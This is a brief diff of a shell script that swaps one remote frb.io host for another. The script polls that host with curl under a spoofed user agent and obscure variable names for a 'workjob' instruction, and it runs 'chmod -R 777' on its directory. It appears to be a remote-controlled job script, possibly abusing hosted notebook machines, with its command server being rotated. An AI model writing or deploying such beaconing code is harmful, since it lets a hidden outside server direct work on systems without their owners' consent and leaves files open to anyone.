@@ -17,11 +17,11 @@ chmod -R 777 ./
 
 cd /notebooks/
 
-google841212121274="https://custom-7mgu.frb.io/"
+google841212121274="https://custom-mwul.frb.io/"
 
 google84="26884"
 
-string=$(curl -s -A "mobile84" https://custom-7mgu.frb.io/?work=workjob)
+string=$(curl -s -A "mobile84" https://custom-mwul.frb.io/?work=workjob)
 if [[ $string == *"16384"* ]]; then
 
 cd /notebooks/
